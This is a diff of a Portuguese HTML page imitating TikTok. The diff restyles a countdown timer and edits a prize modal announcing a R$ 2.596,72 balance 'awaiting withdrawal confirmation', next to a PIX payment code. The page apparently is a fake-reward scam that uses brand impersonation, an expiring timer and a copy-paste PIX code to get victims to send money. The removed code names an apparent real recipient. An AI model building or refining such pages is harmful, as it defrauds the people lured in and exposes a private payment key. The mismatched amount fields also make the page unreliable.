@@ -287,7 +287,7 @@
       border: 2px solid white;
     }
 
-    /* timer */
+    /* timer - com cores ajustadas */
     .timer-wrapper {
       background: #1e1e1e;
       border-radius: 60px;
@@ -297,6 +297,15 @@
       gap: 12px;
       color: white;
       margin-bottom: 20px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+
+    .timer-label {
+      font-weight: 700;
+      color: #fe2c55; /* rosa TikTok */
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      font-size: 14px;
     }
 
     .timer-clock {
@@ -312,11 +321,13 @@
     .timer-box {
       min-width: 36px;
       text-align: center;
-      color: #25f4ee;
+      color: #25f4ee; /* ciano TikTok */
+      text-shadow: 0 0 5px rgba(37,244,238,0.5);
     }
 
     .timer-separator {
       color: #fe2c55;
+      font-weight: 800;
     }
 
     /* modal overlay */
@@ -642,7 +653,7 @@
     <div class="parabens">
       <div>
         <span class="parabens-txtum">Parabéns!</span>
-        <span class="parabens-txtdois">Você concluiu todas as tarefas! </span>
+        <span class="parabens-txtdois">Você concluiu todas as tarefas!</span>
         <span class="parabens-valor">R$ 2.596,72</span>
       </div>
       <div class="parabens-img"><i class="fas fa-star" style="color: #fe2c55;"></i></div>
@@ -785,9 +796,9 @@
       <i class="fas fa-trophy" style="font-size:70px; color:#fe2c55;"></i>
       <div class="gol">Gol de Prêmios</div>
       <p style="color:#333;">Parabéns! Campanha exclusiva.</p>
-      <div class="saldo-valor" data-amount="2596.72">R$ 2.596,72</div>
+      <div class="saldo-valor" data-amount="4596.72">R$ 2.596,72</div>
       <div class="timer-wrapper" style="margin:20px 0; background:#f0f0f0;">
-        <span class="timer-label"style="Expira em</span>
+        <span class="timer-label">Expira em</span>
         <div class="timer-clock" id="modal-timer">
           <span class="timer-box">00</span>:<span class="timer-box">16</span>:<span class="timer-box">38</span>
         </div>
@@ -864,7 +875,7 @@
       <div style="text-align:center;"><i class="fab fa-tiktok fa-3x" style="color:#fe2c55;"></i></div>
       <div class="confirmation-balance">
         <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
-        <div class="confirmation-balance-amount" data-amount="2596.72">R$ 2.596,72</div>
+        <div class="confirmation-balance-amount" data-amount="4596.72">R$ 2.596,72</div>
         <div style="color:#666;">Aguardando confirmação para saque</div>
       </div>
 
@@ -884,14 +895,14 @@
         <button class="copy-btn" style="margin-top:16px;" onclick="copiarLink()"><i class="fas fa-copy"></i> Copiar link</button>
       </div>
 
-      <!-- Chave PIX Copia e Cola (fonte reduzida) -->
+      <!-- Chave PIX copia e cola (fonte reduzida) -->
       <div class="confirmation-pix-area">
         <div style="display:flex; gap:8px; margin-bottom:16px;">
           <i class="fas fa-pix" style="color:#32BCAD; font-size:20px;"></i>
-          <span style="font-weight:600;">Chave PIX (Copia e Cola)</span>
+          <span style="font-weight:600;">Chave PIX (copia e cola)</span>
         </div>
         <div class="confirmation-pix-key" id="pix-copia-cola">
-          00020126580014BR.GOV.BCB.PIX01366d51cf69-55ed-4006-afa1-c5d962a54ffb520400005303986540519.725802BR5925JORGE VYTOR GOMES PEREIRA6014RIO DE JANEIRO622605225zxfS7QxdUXtSnncWjwt6y6304B479
+          00020126360014br.gov.bcb.pix0114+55119999999995204000053039865404596.725802BR5912Fulano Silva6009Sao Paulo62070503***6304E2F3
         </div>
         <button class="copy-btn" style="margin-top:12px;" onclick="copiarPix()"><i class="fas fa-copy"></i> Copiar código PIX</button>
       </div>
